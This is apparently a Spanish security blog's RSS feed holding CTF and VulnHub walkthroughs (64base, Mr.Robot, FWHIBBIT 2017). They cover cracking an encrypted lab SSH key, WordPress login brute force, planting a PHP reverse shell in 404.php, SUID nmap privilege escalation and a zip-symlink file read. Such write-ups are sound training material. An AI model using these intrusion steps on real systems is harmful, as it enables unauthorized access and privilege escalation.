+b0QxQ2t2Sk5EWTNLUFcrR2tOOUwrOUNQeTgrRE51bkZJd3gKK1QrKzdRZy91UFhLcTRNNjFJUTgw
+MzRVaHVSV1M0VHFQOWF6WDNDRzlMeW9pQjZWYktPZUR3TjhhaWxMS1pCcwpmWTlRNkFNMXN5bGl6
+SDFubnhLT3RaUVd1cnhqR0pCSXM2MnRlbE1rYXM5eU5NazNMdTdxUkg2c3dPOXNkVEJpCitqMHg0
+dURaakpjZ01YeGZiMHc1QTY0bFlGc01SekZqN1hkZnkxOStNZThKRWhROEtOWER3UUtEeVVMRk9U
+c3oKMTNWZkJOeFlzeUw1ekdYTnp5cVo0SS9PTzdNZWQyajBHejBnMjFpSEEvMDZtcnMyY2xkczZT
+VUJHRXZuOE5pVgpyU3JINnZFczRTemcweDhkZEd2UTBxVzF2TWtUUnUzT3kvZTEwRjc0NXhETUFU
+S1JsS1o2cllITUN4SjNJY250CkV6ME9NWFlkQzZDaUYvSVd0Z2RVK2hLeXZzNHNGdENCY2xTYWdt
+RFRKMmtaZHU0UlJ3WVZWNm9JTno5YnBPdkUKUngzSFVxZm5LU2hydXpNOVpraUlrdVNmUnRmaU12
+YlR6ZmZKVFM0YzQ4Q081WC9SZUYvQWFNeGtiU2RFT0ZzSQpGdjlYZGk5U2ROdXhHSEUyRzRIdkpk
+SXByRlVyVlNwU0k4MHdncmIyNDVzdzZnVG9pdFo5MGhKNG5KNWF5N0FHCllpYWE1bzc4NzcvZnc2
+WVovMlUzQURkaVNPQm0raGpWMkpWeHJveVVYYkc1ZGZsM204R3ZmNzFKNjJGSHE4dmoKcUphblNr
+ODE3NXowYmpyWFdkTEczRFNsSUppc2xQVyt5RGFmN1lCVll3V1IrVEExa0M2aWVJQTV0VTNwbi9J
+Mwo2NFo1bXBDK3dxZlR4R2dlQ3NnSWs5dlNuMnAvZWV0ZEkzZlFXOFdYRVJiRGV0MVVMSFBxdElp
+N1NaYmo4ditQCmZuSExRdkV3SXMrQmYxQ3BLMUFrWmVVTVJFUWtCaERpNzJIRmJ3MkcvenF0aS9Z
+ZG5xeEF5bDZMWnpJZVFuOHQKL0dqNGthckoxaU05SWYzOWRNNU9hQ1ZaUi9UT0JWYVI4bXJQN1Z0
+Sm9yOWplSDJ0RUwwdG9FcVdCMVBLMHVYUAotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Que decodeado nos muestra una clave rsa privada cifrada.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
+-----BEGIN RSA PRIVATE KEY-----  
+Proc-Type: 4,ENCRYPTED  
+DEK-Info: AES-128-CBC,621A38AAD4E9FAA3657CA3888D9B356C  
+mDtRxIwh40RSNAs2+lNRHvS9yhM+eaxxU5yrGPCkrbQW/RgPP+RGJBz9VrTkvYw6
+YcOuYeZMjs4fIPn7FZyJgxGHhSxQoxVn9kDkwnsMNDirtcoCOk9RDAG5ex9x4TMz
+8IlDBQq5i9Yzj9vPfzeBDZdIz9Dw2gn2SaEgu5zel+6HGObF8Zh3MIchy8s1XrE0
+kvLKI252mzWw4kbSs9+QaWyh34k8JIVzuc1QCybz5WoU5Y56G6q1Rds0bcVqLUse
+MSzKk3mKaWAyLXlo7LnmqqUFKHndBE1ShPVVi4b0GyFILOOvtmvFb4+zhu6jOWYH
+k2hdCHNSt+iggy9hh3jaEgUnSPZuE7NJwDYa7eSDagL17XKpkm2YiBVrUXxVMnob
+wXRf5BcGKU97xdorV2Tq+h9KSlZe799trTrFGNe05vxDrij5Ut2KcQx+98K8KpWL
+guJPRPKGijo96HDGc3L5YsxObVg+/fj0AvsKfrcV/lxaW+Imymc1MXiJMbmCzlDw
+TAWmaqkRFDyA1HUvtvSeVqS1/HjhDw9d4KsvsjkjvyeQTssfsdGcU0hDkXwRWssd
+2d3G+Njm1R5ZLNgRlNpVGjhKC4AsfXS3J0z2t3BPM9ZOBMBe9Dx8zm5xFY9zWtrv
+AGpr0Bh8KQwmpjQUc1afsqaQX0UHNLXT1ZOWKjg4SA3XC9dCEyFq0SIxQjO9LGCG
+4Q5ncfUhmvtqyutCll2dXPsXVDe4eoD1CkvJNDY3KPW+GkN9L+9CPy8+DNunFIwx
++T++7Qg/uPXKq4M61IQ8034UhuRWS4TqP9azX3CG9LyoiB6VbKOeDwN8ailLKZBs
+fY9Q6AM1sylizH1nnxKOtZQWurxjGJBIs62telMkas9yNMk3Lu7qRH6swO9sdTBi
++j0x4uDZjJcgMXxfb0w5A64lYFsMRzFj7Xdfy19+Me8JEhQ8KNXDwQKDyULFOTsz
+13VfBNxYsyL5zGXNzyqZ4I/OO7Med2j0Gz0g21iHA/06mrs2clds6SUBGEvn8NiV
+rSrH6vEs4Szg0x8ddGvQ0qW1vMkTRu3Oy/e10F745xDMATKRlKZ6rYHMCxJ3Icnt
+Ez0OMXYdC6CiF/IWtgdU+hKyvs4sFtCBclSagmDTJ2kZdu4RRwYVV6oINz9bpOvE
+Rx3HUqfnKShruzM9ZkiIkuSfRtfiMvbTzffJTS4c48CO5X/ReF/AaMxkbSdEOFsI
+Fv9Xdi9SdNuxGHE2G4HvJdIprFUrVSpSI80wgrb245sw6gToitZ90hJ4nJ5ay7AG
+Yiaa5o7877/fw6YZ/2U3ADdiSOBm+hjV2JVxroyUXbG5dfl3m8Gvf71J62FHq8vj
+qJanSk8175z0bjrXWdLG3DSlIJislPW+yDaf7YBVYwWR+TA1kC6ieIA5tU3pn/I3
+64Z5mpC+wqfTxGgeCsgIk9vSn2p/eetdI3fQW8WXERbDet1ULHPqtIi7SZbj8v+P
+fnHLQvEwIs+Bf1CpK1AkZeUMREQkBhDi72HFbw2G/zqti/YdnqxAyl6LZzIeQn8t
+/Gj4karJ1iM9If39dM5OaCVZR/TOBVaR8mrP7VtJor9jeH2tEL0toEqWB1PK0uXP  
+-----END RSA PRIVATE KEY-----&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;La clave está cifrada y al intentar conectarnos por ssh a la máquina nos pide una passphrase que no tenemos…por lo que tenemos que hacer bruteforce (tal y como decía la imagen) para averiguarla.&lt;/p&gt;
+
+&lt;p&gt;Buscando por internet una herramienta para hacer fuerza bruta al passphrase de una clave rsa nos encontramos con una tool llamada “phrasendrescher” en la página de pentestmonkey.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://pentestmonkey.net/blog/phrasendrescher&quot;&gt;http://pentestmonkey.net/blog/phrasendrescher&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Primero intentamos hacer una fuerza bruta de carácter incremental entre 1 y 8 caractéres:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/64base/flag6_1.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Trás un rato y viendo que no obteniamos resultado decido intentarlo con el diccionario por excelencia en estos casos, rockyou.txt, con el que efectivamente obtenemos resultado:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/64base/flag6_2.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A partir de aquí podemos hacerlo de dos formas:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Entrar por ssh con la clave cifrada y cuando nos pida el passphrase insertarlo&lt;/li&gt;
+  &lt;li&gt;Descifrar la clave con el comando openssl y entrar por ssh con la clave descifrada.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Nosotros hemos optado por descifrar la clave y acceder con ella.&lt;/p&gt;
+
+&lt;p&gt;Para descifrar la clave utilizamos el siguiente comando:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;openssl rsa -in encrypted.key -out decrypted.key&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez que estamos dentro nos muestra directamente la flag6&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/64base/flag6_3.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;que decodeando el contenido de la cadena en base64 obtenemos una cadena en hexadecimal:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;4e546b325a4451324e324531595455304e546b7a4d4451354e444d7a4d545a694e446b304d7a4d354d7a49314f5455344e446b334e6a59794e44637a4f545a684e546b314e7a63334e7a5930597a5a6b4e7a677a4d5459784d7a49314e6a4d344e6a49304e7a55324e3245324d7a63354d7a55334f5456684e5463304e6a637a4e444d324e7a4e6b4d32517759516f3d0a&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;que convirtiendolo en ascci nos devuelve otra cadena en base64:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;NTk2ZDQ2N2E1YTU0NTkzMDQ5NDMzMTZiNDk0MzM5MzI1OTU4NDk3NjYyNDczOTZhNTk1Nzc3NzY0YzZkNzgzMTYxMzI1NjM4NjI0NzU2N2E2Mzc5MzU3OTVhNTc0NjczNDM2NzNkM2QwYQo=&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;que decodeandola obtenemos otra cadena en hexadecimal&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;596d467a5a5459304943316b49433932595849766247396a595777764c6d7831613256386247567a637935795a57467343673d3d0a&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;que convirtiendolo a ascci obtenemos una última cadena en base64&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;YmFzZTY0IC1kIC92YXIvbG9jYWwvLmx1a2V8bGVzcy5yZWFsCg&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;que decodeandola nos muestra el siguiente comando:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;base64 -d /var/local/.luke\|less.real&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Trás ejecutar el comando en la sesión ssh que tenemos abierta obtenemos el mensaje de que hemos finalizado la máquina.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/64base/flag6_4.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 15 Mar 2017 12:11:34 +0000</pubDate>
+        <link>https://blog.roskyfrosky.com/vulnhub/2017/03/15/64base-vulnhub.html</link>
+        <guid isPermaLink="true">https://blog.roskyfrosky.com/vulnhub/2017/03/15/64base-vulnhub.html</guid>
+        
+        <category>boot2root</category>
+        
+        
+        <category>vulnhub</category>
+        
+      </item>
+    
+      <item>
+        <title>Mr.Robot VulnHub Boot2Root</title>
+        <description>&lt;h1 id=&quot;mrrobot-boot2root-vulnhub&quot;&gt;Mr.Robot Boot2Root Vulnhub&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;URL de la máquina:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/mr-robot-1,151/&quot;&gt;https://www.vulnhub.com/entry/mr-robot-1,151/&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Descripción:&lt;/strong&gt; Based on the show, Mr. Robot. 
+This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find.
+The VM isn’t too difficult. There isn’t any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.&lt;/p&gt;
+
+&lt;h2 id=&quot;solución&quot;&gt;Solución&lt;/h2&gt;
+
+&lt;p&gt;Lo primero que hacemos siempre, es realizar un escaneo de puertos de la máquina para ver que servicios están corriendo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/mrrobot/scaneo.png&quot; alt=&quot;Nmap&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que tiene abiertos los puertos 80, y 443.&lt;/p&gt;
+
+&lt;p&gt;Accedemos a la ip por el navegador para comprobar que nos encontramos&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/mrrobot/flag1_1.png&quot; alt=&quot;Flag 1&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos aparece una intro y nos aparece una shell en la cuál podemos introducir los comandos que aparecen en pantalla. Jugamos un rato con los comando y vemos que no son de utilidad, que son solo una distración, por lo que pasamos a empezar a analizar la página.
+En primer lugar, una de las cosas que suelo hacer siempre en una web es comprobar si existe el fichero robots.txt&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/mrrobot/flag1_2.png&quot; alt=&quot;Flag 2&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y nos encontramos con la primera flag de las tres que hay. Accedemos al fichero “key-1-of-3.txt” y obtenemos &lt;strong&gt;073403c8a58a1f80d943455fb30724b9&lt;/strong&gt;.
+El otro fichero “fsociety.doc” parece ser un diccionario que tendremos que utilizar más tarde.&lt;/p&gt;
+
+&lt;p&gt;Acto seguido, trás mirar el código fuente de la página, las cabeceras de las peticiones y demás cosas básicas, lanzamos un dirbuster para ver si encontramos algún directorio o fichero interesante.Para ello utilizamos el diccionario por defecto “commont.txt” que viene con la propia herramienta.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/mrrobot/dirbuster.png&quot; alt=&quot;Dirbuster&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Encontramos un par de directorios interesantes que son “admin” y “dashboard” por lo que intentamos entrar en ellos.
+Al intentar entrar en el directorío dashboard nos hace una redirección como bien se ha marcado en la imagen del Dirbuster y nos redirige al login de un wordpress.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/mrrobot/wordpress_1.png&quot; alt=&quot;Wordpress&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Comprobamos si existe enumeración de usuarios y comprobamos que es correcto. Trás probar varios usuarios típicos como admin,root,administrador,administrator,etc siempre obtenemos el mensaje “Usuario o contraseña inválidos” por lo que pensamos en empezar a poner nombres de personajes de la serie de MrRobot, que para eso se llama así la máquina.&lt;br /&gt;
+Y en seguida encontramos que existe un usuario con nombre “elliot”.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/mrrobot/wordpress_login.png&quot; alt=&quot;Wordpress Login&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Entonces pensamos que el diccionario que hemos encontrado en primer lugar, tiene que ser para hacer fuerza bruta al login.Dado que es un wordpress, utilizamos la herramienta por excelencia con este cms, wpscan, y trás un largo rato conseguimos encontrar la contraseña.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/mrrobot/bruteforce_login.png&quot; alt=&quot;Wordpress Bruteforce&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Procedemos a entrar al wordpress con usuario “elliot” y contraseña “ER28-0652”.
+Una vez dentro lo primero que hacemos es comprobar que nivel de privilegios tiene el usuario con el que hemos conseguido acceder.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/mrrobot/users_wordpress.png&quot; alt=&quot;Wordpress users&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tenemos suerte ya que nuestro usuario tiene permisos de administrador, por lo que el siguiente paso es editar un fichero existente en el servidor para conectarnos con una reverse shell a nuestra máquina y hacernos las cosas algo más sencillas.&lt;/p&gt;
+
+&lt;p&gt;Para ello, accedemos a nuestra página preferida para hacer pentesting donde podemos encontrar una reverse shell en php:
+&lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos las descargamos y copiamos el código habiendo modificado la IP y el puerto donde queremos que se conecte la máquina y lo copiamos en un fichero del wordpress.
+Nosotros hemos elegido el fichero 404.php.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/mrrobot/reverse_shell.png&quot; alt=&quot;Reverse Shell&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez que hemos modificado el fichero con la reverse shell, lanzamos un netcat en nuestra máquina local, en modo listen(parámetro -l) en el puerto que hemos elegido en el fichero de la reverse shell y accedemos al fichero 404.php para que se produzca la conexión.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/mrrobot/conexion_inversa.png&quot; alt=&quot;Conexión inversa&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez realiza la conexión inversa, comprobamos que usuario somos con el comando “whoami” y después pasamos a la búsqueda de la siguiente flag.
+Para ello en estos caso suele estar en el home de algún usuario, por lo que entro en el único usuario que hay en la máquina “home/robot” y listamos los ficheros que se encuentran en el directorio.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/mrrobot/flag2_1.png&quot; alt=&quot;Flag 2&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que existen dos ficheros entre los cuales se encuentra la segunda flag que estabamos buscando.
+Por desgracia ambos ficheros pertenencen al usuario y grupo robot, pero por suerte el segudon fichero “password.raw-md5” tiene permisos de lectura habilitado para todos los usuarios.
+Hacemos un cat al fichero y nos arroja un usuario “robot” y el hash md5 de su contraseña, que debemos buscar por internet para comprobar si está crackeado.
+Accedemos a &lt;a href=&quot;https://hashkiller.co.uk/&quot;&gt;https://hashkiller.co.uk/&lt;/a&gt; e introduccimos el hash que hemos obtenido, y por suerte está crackeado :D.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/mrrobot/hash_md5.png&quot; alt=&quot;Hash MD5&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora para leer la key 2 solo tenemos que loguearnos como usuario robot y hacer un cat al fichero “key-2-of-3.txt”&lt;/p&gt;
+
+&lt;p&gt;Al intentar loguearnos con el usuario robot, nos indica que tenemos que hacerlo desde un terminal, por lo que vamos a invocar una shell mediante python.
+Para ello utilizamos la siguiente porción de código:&lt;/p&gt;
+
+&lt;p class=&quot;code&quot;&gt;echo “import pty; pty.spawn(‘/bin/bash’)” &amp;gt; /tmp/asdf.py
+python /tmp/asdf.py&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/mrrobot/flag2_2.png&quot; alt=&quot;Flag 2&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora toca buscar la tercera clave.Por norma general la última clave solo puede ser accesible por el usuario root, por lo que vamos a ver si podemos elevar privilegios en el sistema. Para ello realizamos una busqueda para ver si existe algún fichero que tengo el bit suid activo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/mrrobot/flag3_1.png&quot; alt=&quot;Flag 3&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vaya parece ser que hay suerte y encontramos la herramienta nmap con el bit suid activo, lo que significa que si lanzamos la herramienta en modo interactivo nos permitirá ejecutar comandos.La idea ahora es invocar una shell mediante comando que se ejecutara con usuario root.&lt;/p&gt;
+
+&lt;p&gt;Para ello lanzamos la herramienta en modo interactivo con el commando&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -\-interactive&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Dado que no me acuerdo que parámetro se utiliza para lanzar comandos en el modo interactivo, utilizo “h” para que me muestre la ayuda.
+Vemos que para ejecutar comandos debe de ir acompañados con el carácter “!” al principio.
+Ejecutamos !/bin/sh para para obtener una shell y comprobamos que somos el usuairo root.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/mrrobot/help_nmap.png&quot; alt=&quot;Help Nmap&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dado que ya somos usuario root, ahora solo queda entrar en el directorio root y hacerle un cat al fichero “key-3-of-3.txt”.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/mrrobot/flag3_2.png&quot; alt=&quot;Flag 3&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Además del fichero “key-3-of-3.txt” nos encontramos un fichero “firstboot_done” que nos indica que hemos terminado la máquina.&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 07 Mar 2017 12:11:34 +0000</pubDate>
+        <link>https://blog.roskyfrosky.com/vulnhub/2017/03/07/mrrobot-vulnhub.html</link>
+        <guid isPermaLink="true">https://blog.roskyfrosky.com/vulnhub/2017/03/07/mrrobot-vulnhub.html</guid>
+        
+        <category>boot2root</category>
+        
+        
+        <category>vulnhub</category>
+        
+      </item>
+    
+      <item>
+        <title>Writeup [Web] FWHIBBIT 2017</title>
+        <description>&lt;h1 id=&quot;hate&quot;&gt;Hate&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;Points:&lt;/strong&gt; 200&lt;br /&gt;
+&lt;strong&gt;Country:&lt;/strong&gt; Madagascar&lt;br /&gt;
+&lt;strong&gt;Link:&lt;/strong&gt; &lt;a href=&quot;http://web5.ctf.followthewhiterabbit.es/&quot;&gt;http://web5.ctf.followthewhiterabbit.es/&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Description:&lt;/strong&gt; There is a phisher who pretends to be us, can you help us to pwn him?&lt;/p&gt;
+
+&lt;p&gt;Entramos en la página y lo primero que hacemos es mirar el código fuente de la página donde encontramos que hay una zona privada.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/madagascar1.png&quot; alt=&quot;Web Madagascar&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Accedemos a http://web5.ctf.followthewhiterabbit.es/admin.php y volvemos a mirar el source de la página y vemos que nos indica cuales son las credenciales:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/madagascar2.png&quot; alt=&quot;Web Madagascar&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Metemos las credenciales que nos indican (admin: admin) y nos aparece un upload para subir ficheros en el cuál indican que debe de ser un zip:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/madagascar3.png&quot; alt=&quot;Web Madagascar&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Trás varias pruebas vemos que al subirel fichero zip, lo desempaqueta, comprueba si existe el fichero y en caso correcto muestra el resultado. Como en el enunciado nos dicen que la flag está en /etc/flag creamos un link simbólico y lo empaquetamos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/madagascar4.png&quot; alt=&quot;Web Madagascar&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Subimos el Zip y nos muestra la flag:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/madagascar5.png&quot; alt=&quot;Web Madagascar&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 21 Feb 2017 12:11:34 +0000</pubDate>
+        <link>https://blog.roskyfrosky.com/web/2017/02/21/writeup-web-ctf-fwhibbit.html</link>
+        <guid isPermaLink="true">https://blog.roskyfrosky.com/web/2017/02/21/writeup-web-ctf-fwhibbit.html</guid>
+        
+        <category>writeup</category>
+        
+        
+        <category>web</category>
+        
+      </item>
+    
+      <item>
+        <title>Writeup [Esteganografía] FWHIBBIT 2017</title>
+        <description>&lt;h1 id=&quot;ones-and-zeroes&quot;&gt;Ones and Zeroes&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;Points:&lt;/strong&gt; 100&lt;br /&gt;
+&lt;strong&gt;Country:&lt;/strong&gt; Nigeria&lt;br /&gt;
+&lt;strong&gt;Attatchment:&lt;/strong&gt;&lt;a href=&quot;https://blog.roskyfrosky.com/files/CTFS/2017/fwhibbit/FuckSociety.zip&quot;&gt;File to download&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Description:&lt;/strong&gt; The Dark Army told me that Stage 2 is ready. When you see it, you’ll be pleased. It worked,
+Elliot…do not forget to hide all the information in those stupid CDs!!!
+It’s up to us now. Let me show you.&lt;/p&gt;
+
+&lt;p&gt;En este caso nos descargamos un fichero del enlace llamado “Fuck Society.flac”. Lo abrimos con DeepSound para ver si contiene algún fichero en su interior.
+Nos pide una clave que es “ElliotAlderson” y nos muestra que contiene un fichero oculto en su interior con nombre fsociety.txt.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/nigeria1.png&quot; alt=&quot;Stego Nigeria&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo abrimos y vemos la flag : fwhibbit{0ur_D3m0cr4cy_h4s_b33n_H4ck3d}&lt;/p&gt;
+
+&lt;p&gt;##Flag Inside
+&lt;strong&gt;Points:&lt;/strong&gt; 125&lt;br /&gt;
+&lt;strong&gt;Country:&lt;/strong&gt; France&lt;br /&gt;
+&lt;strong&gt;Attatchment:&lt;/strong&gt;&lt;a href=&quot;https://blog.roskyfrosky.com/files/CTFS/2017/fwhibbit/flag_inside.pdf&quot;&gt;File to download&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Description:&lt;/strong&gt; I’m sure this file hides something … but I do not know exactly what. Can you help me?&lt;/p&gt;
+
+&lt;p&gt;Nos descargamos un fichero con nombre “flag_inside.pdf”. El fichero contiene un base64 que es una imagen,por lo que utilizamos una tool online (http://codebeautify.org/base64-to-image-converter) que nos dá la siguiente imagen:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/francia1.png&quot; alt=&quot;Stego Francia&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si utilizamos gimp, vamos a filtros → Distorsión → Remolinos y aspiración.
+Modificando el parámetro ángulo de remolino obtenemos la imagen con la flag:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/francia2.png&quot; alt=&quot;Stego Francia&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 21 Feb 2017 12:11:34 +0000</pubDate>
+        <link>https://blog.roskyfrosky.com/steganography/2017/02/21/writeup-steganography-ctf-fwhibbit.html</link>
+        <guid isPermaLink="true">https://blog.roskyfrosky.com/steganography/2017/02/21/writeup-steganography-ctf-fwhibbit.html</guid>
+        
+        <category>writeup</category>
+        
+        
+        <category>steganography</category>
+        
+      </item>
+    
+      <item>
+        <title>Writeup [Reversing] FWHIBBIT 2017</title>
+        <description>&lt;h1 id=&quot;reversing-like-a-boss&quot;&gt;Reversing ‘like’ a boss&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;Points:&lt;/strong&gt; 100&lt;br /&gt;
+&lt;strong&gt;Country:&lt;/strong&gt; Romania&lt;br /&gt;
+&lt;strong&gt;Attatchment:&lt;/strong&gt;&lt;a href=&quot;https://blog.roskyfrosky.com/files/CTFS/2017/fwhibbit/fwhibbit.exe&quot;&gt;File to download&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Description:&lt;/strong&gt; We have this file, but we aren’t able to extract the secret info inside, can you help us? The world’s future is in your hands!&lt;/p&gt;
+
+&lt;p&gt;Se trata de un binario .Net , por lo que lo decompilamos y se ve la flag en claro.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/rumania1.png&quot; alt=&quot;Reversing Rumania&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Flag: flag fwhibbit{OBFUSCATE_NET!}&lt;/p&gt;
+
+&lt;h2 id=&quot;mayday-mayday&quot;&gt;Mayday Mayday&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Points:&lt;/strong&gt; 150&lt;br /&gt;
+&lt;strong&gt;Country:&lt;/strong&gt; South Africa&lt;br /&gt;
+&lt;strong&gt;Attatchment:&lt;/strong&gt;&lt;a href=&quot;https://blog.roskyfrosky.com/files/CTFS/2017/fwhibbit/fwhibbit&quot;&gt;File to download&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Description:&lt;/strong&gt; Hi aspirant, we lost all our carrots, for this reason we need your skills so please… try to steal
+the private bank of carrots for us.
+The time begins…NOW!&lt;/p&gt;
+
+&lt;p&gt;Nos dan un ELF de 32 bits, lo ejecutamos para ver que ocurre y nos aparece un mensaje de un dollar y nos pregunta una password.Como no la sabemos vamos a abrirlo con el IDA y vemos como funciona.
+Comprobamos donde se hace el You win and You lose y ponemos un breakpoint en la comprobación.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/africa1.png&quot; alt=&quot;Reversing Africa &quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
